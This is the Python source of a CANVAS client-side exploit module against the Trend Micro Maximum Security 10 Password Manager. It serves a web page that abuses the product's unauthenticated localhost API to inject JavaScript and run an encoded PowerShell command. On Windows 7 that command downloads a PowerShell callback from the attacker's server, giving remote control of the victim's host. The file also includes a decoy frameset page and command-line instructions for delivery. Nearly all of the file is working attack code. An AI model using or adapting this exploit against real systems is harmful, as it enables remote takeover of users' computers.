#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2016
# http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement
import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside

import sys
import canvasengine
import base64
import logging

from libs.spkproxy import header, body
from libs.ua_parser import user_agent_parser
from Nodes.mosdef_powershell.mosdef_powershell import *

NAME                             = "Trend Micro Maximum Security 10 Client-Side Exploit"
DESCRIPTION                      = "Client-side exploit for Trend Micro Maximum Security 10 arbitrary command execution vulnerability"
DOCUMENTATION                    = {}
DOCUMENTATION['VENDOR']          = "Trend Micro"
DOCUMENTATION["Repeatability"]   = "Infinite"
DOCUMENTATION["References"]      = "https://code.google.com/p/google-security-research/issues/detail?id=693"
DOCUMENTATION['VersionsAffected']= "Trend Micro Maximum Security with Password Manager <3.5.0.1201"
DOCUMENTATION["CVE Name"]        = "N/A"
DOCUMENTATION["CVE Url"]         = "N/A"
DOCUMENTATION["NOTES"]           = """


The vulnerability per se is an arbitrary command execution in the Password Management component that comes bundled with the antivirus Trend Micro Maximum Security 10. This tool that comes bundled with the antivirus is used to store passwords by users.

This client-side exploit uses the command execution vulnerability and obtain control over the target host by injecting a PowerShell callback. 

Technical Stuff:

The Password Management tool was built using JavaScript and Node.js, and started a local web server that would listen, without using a whitelist or same origin policy, for API commands. Using the API command openUrlInDefaultBrowser with the url parameter: https://localhost:49155/api/openUrlInDefaultBrowser?url=c:/windows/system32/calc.exe it is possible to obtain a command execution because the openUrlInDefaultBrowser endpoint eventually maps to ShellExecute(). The issue with this endpoint it is not possible call powershell with parameters so we use another resource that is also vulnerable: the showSB endpoint. Notice that the /api/showSB endpoint will spawn an ancient build of Chromium (version 41) with --disable-sandbox!!. Abusing of this endpoint we can inject javascript code in the url parameter and call the topwindow javascript component from Node.js in order to spawn the powershell process with parameters (topWindow.require('child_process').spawn('powershell', [ 'arg_name', 'arg_value' ])). The only problem of using this endpoint is that Password Manager tool popups in the target.

References:
https://code.google.com/p/google-security-research/issues/detail?id=693

Note: This exploit should be used with the clientd option "respond directly with exploit"


This exploit has been tested on:
* Windows 8.1 EN (x32) with Trend Micro Maximum Security 10.0.1186 and Password Manager Version 3.5.0.1201 and 3.5.0.1223 
* Windows 7 Ultimate N EN (x32) with Trend Micro Maximum Security 10.0.1186 and Password Manager Version 3.5.0.1201

TODO:
-Find the way to suspend the server process to avoid updates

Command line usage:
$ python ./exploits/clientd/clientd.py -l 192.168.1.102 -d 5555 -O server_port:8080 -O allowed_attack_modules:trendmicro_maxsec_10 -O auto_detect_exploits:0
$ ./commandlineInterface.py -v23 -p5555

"""

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["Windows"] ]
PROPERTY['VERSION']             = ['7','8','8.1']
PROPERTY['DELIVERY']            = 'HTTP'

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version                 = 0
        self.name                    = NAME
        # filename is used in the actual http server
        self.filename                = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + "00.html"
        self.badstring               = '\x00'
        self.payload                 = ""
        self.psmosdef                = None
        self.pscallback              = ""
        self.pscallback_filename     = "pscb.ps1"
        self.win7                    = False 

    def is_vulnerable(self, info_dict):
        user_agent  = info_dict['user_agent']
        parsed = user_agent_parser.Parse(user_agent)
        if 'Windows' not in parsed['os']['family']:
            return 0
        #detect if the os is Windows 7
        self.win7 = self.isWin7(user_agent)
        return 1

    def isWin7(self,user_agent):
        pattern = "Windows NT"
        if pattern in user_agent:
            win_ver = float(user_agent[user_agent.index(pattern)+len(pattern):user_agent.index(pattern)+len(pattern)+4])
            if win_ver == 6.1:
                return True
         
        return False

    def generate_command(self):
        if not self.psmosdef:
            return ""
        
        if self.win7:
            server = self.sessionstate.loader.canvasobj.getBaseURL() 
            url = server+"/"+ self.pscallback_filename
            return self.psmosdef.generateRequestRemotePSCommand(url=url,b64encode=True)
        else:
            return self.psmosdef.generateEncPSCommand(compression=True)
    
    def generate_html(self):
        html = """
                <html>
                <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" >
                <head></head>
                <body>
                <script>
                function add() {

                        var body = document.getElementsByTagName('body').item(0);
                        
                        // password manager tries open a port starting here until it works.
                        var port = 49155;
                        var enc_cmd  = "%s"
                        var code = "topWindow.require('child_process').spawn('powershell', [ '-enc', '" + enc_cmd + "' ])"

                        for (; port <= 49162; port++) {
                            var url = 'https://localhost:' + port + '/api/showSB?url=javascript:eval('+code+')'; 
                            var img   = document.createElement('img');
                            img.src   = url;
                            body.appendChild(img);
                        }
                }
                add();
                </script>
                </body>
                </html>
                """
        return html % self.generate_command()
    
    def generate_template(self):
        template = """
        <html>
        <head>
            <title>Hi Friend!</title>
        </head>
        <frameset rows="*,1px">
            <frame src="http://www.immunityinc.com/" frameborder="0" noresize="noresize" />
            <frame src="/%s" frameborder="0" scrolling="no" noresize="noresize" />
        </frameset>
        </html>
        """
        return template % self.filename

    def makesploit(self, clientheader, clientbody):
        h = header('SERVER')
        b = body()
       
        self.psmosdef   = mosdef_powershell(self)
        self.pscallback = self.psmosdef.createMosdefCallback()

        if self.plugin_info:
            logging.info("We got a plugin info for this target - thanks clientd!")
            info_dict   = self.plugin_info
            user_agent  = info_dict['user_agent']
            
            if self.is_vulnerable(info_dict):
                logging.info("This client is most likely vulnerable")
            else:
                logging.error("Bailing on this client as it is not likely to be vulnerable")
                return None, None
        else:
            logging.info("Assuming vulnerable - no plugin info found!")
            user_agent = clientheader.getStrValue(['User-Agent'])
            
            if self.isWin7(user_agent):
                logging.info("This client is most likely vulnerable")
                self.win7 = True

        if clientheader.URL.count(self.filename):
            logging.info('Serving Stage 1 HTML file')
            html = self.generate_html()
            b.setBody(html)
            h.addHeader('Content-Type','text/html')

        elif clientheader.URL.count(self.pscallback_filename):
            logging.info('Serving Stage 2 PowerShell Callback Script')
            pscallback = self.pscallback
            b.setBody(pscallback)
        
        else:
            logging.info('Respond with template')
            html = self.generate_template()
            b.setBody(html)
            h.addHeader('Content-Type','text/html')

        return h, b

    def run(self):
        html = self.generate_html()

        logging.info('Opening %s for output' % (self.filename))

        fd = file(self.filename,'wb+')
        fd.write(html)
        fd.close()
        logging.info('Wrote to %s' % (self.filename))

        return 1

if __name__ == '__main__':
    exp = theexploit()
    ret = standard_callback_commandline(exp)

    if ret not in [0, 1, None]:
        ret.interact()
